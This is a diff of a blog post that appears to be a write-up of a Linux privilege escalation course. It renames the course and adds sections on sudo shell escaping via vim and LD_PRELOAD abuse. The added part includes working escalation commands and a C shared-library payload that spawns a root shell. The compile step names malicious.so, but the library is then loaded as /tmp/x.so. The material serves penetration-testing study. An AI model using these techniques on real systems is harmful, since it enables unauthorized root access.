@@ -3,15 +3,15 @@ title: "Linux Privilege Escalation"
 date: 2024-08-17 10:00:00 +0800
 categories: [Linux, Security]
 tags: [Privilege Escalation, Linux]
-excerpt: "A detailed write-up on Linux privilege escalation techniques covered in the TCM Privilege Escalation course."
+excerpt: "A detailed write-up on Linux privilege escalation techniques covered in the Privilege Escalation in Linux."
 ---
 # Linux Privilege Escalation
 ![image.png](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWOckg_ZAWFp4fiDeOwmZnqDQ-JslUjqfXuw&s)
-# **Introduction to the TCM Privilege Escalation Course for Linux**
+# **Introduction to the Privilege Escalation Course for Linux**
 
-The TCM Privilege Escalation Course for Linux is designed to equip cybersecurity enthusiasts with the skills and knowledge needed to elevate their access on Linux systems. Throughout this course, you will delve into various privilege escalation techniques, from exploiting misconfigurations to leveraging kernel vulnerabilities.
+The Privilege Escalation for Linux is designed to equip cybersecurity enthusiasts with the skills and knowledge needed to elevate their access on Linux systems. Throughout this course, you will delve into various privilege escalation techniques, from exploiting misconfigurations to leveraging kernel vulnerabilities.
 
-By the end of this course, you will have a deep understanding of how to identify and exploit weaknesses in Linux systems, making you proficient in the art of privilege escalation. This course is ideal for those looking to enhance their penetration testing skills or seeking to fortify their defenses against unauthorized access in Linux environments.
+By the end of this blog, you will have a deep understanding of how to identify and exploit weaknesses in Linux systems, making you proficient in the art of privilege escalation. This course is ideal for those looking to enhance their penetration testing skills or seeking to fortify their defenses against unauthorized access in Linux environments.
 # System Enumeration :-
 
 First thing i use this command   `hostname`   to display  the system's hostname. The hostname is a unique name assigned to a computer on a network, which helps identify it among other devices.
@@ -328,3 +328,63 @@ We search about some files we use this commands :
 1. In command prompt type: `chmod 400 id_rsa`
 
 2. In command prompt type: **`ssh -i id_rsa root@<ip>`**
+
+
+# Sudo
+
+# Escalation via Sudo Shell Escaping :-
+
+We write `sudo -l` and show results : 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 043359.png)
+
+we can use this website to git PrivEsc  https://gtfobins.github.io/ we will see in /usr/bin/vim
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 043734.png)
+
+we use the first command `sudo vim -c ':!/bin/sh'`  
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 043919.png)
+
+we can try with another commands but we will see another thing
+
+# Escalation via LD_PRELOAD :-
+
+If we see `env_keep+=LD_PRELOAD`
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 050313.png)
+
+### What is `LD_PRELOAD`?
+
+`LD_PRELOAD` is an environment variable used in Unix-like operating systems that allows you to specify a shared library (.so file) to be loaded before any other shared libraries when a program is executed. This can be used to override functions in standard libraries, effectively allowing you to inject custom code into a running process.
+
+### What is `env_keep+=LD_PRELOAD`?
+
+In the context of `sudo`, `env_keep+=LD_PRELOAD` is a directive that can be added to the `sudoers` file to allow the `LD_PRELOAD` environment variable to be preserved when running commands with `sudo`. Normally, `sudo` sanitizes the environment to prevent misuse of environment variables like `LD_PRELOAD`, which could be used to hijack or modify the behavior of privileged programs.
+
+### How to Use `LD_PRELOAD` for Privilege Escalation
+
+If you have access to modify the `sudoers` file or if `env_keep+=LD_PRELOAD` is already configured, you can exploit this to escalate privileges.
+
+we write C code make privlage escalation
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+and run this command  `gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles`
+
+and final command **`sudo LD_PRELOAD=/tmp/x.so apache2`** 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 050921.png)
+
+You should check sudo version by this command `sudo -v`  and search about any exploit
